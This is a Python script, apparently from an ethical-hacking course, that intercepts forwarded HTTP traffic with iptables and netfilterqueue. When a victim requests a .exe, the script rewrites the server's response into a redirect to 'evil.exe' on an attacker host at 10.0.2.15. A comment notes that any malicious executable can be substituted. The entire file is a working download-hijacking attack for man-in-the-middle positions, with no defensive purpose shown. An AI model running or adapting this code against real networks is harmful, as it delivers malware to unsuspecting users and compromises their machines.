#!/usr/bin/env python

# Import Modules
import netfilterqueue
import scapy.all as scapy
import subprocess

ack_list = []


# Function to replace the packet's load
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


# Function to convert packets that were captured in the queue to a scapy packet for analysis
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # Note: Can use any malicious .exe as the value of the 'Location' field
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/evil-files/evil.exe\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()


# Create queue
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

# Bind queue to a Python object
try:
    queue = netfilterqueue.NetfilterQueue()
    # 1st parameter is ID of the queue, 2nd parameter is a callback function that is called for each packet in the queue
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
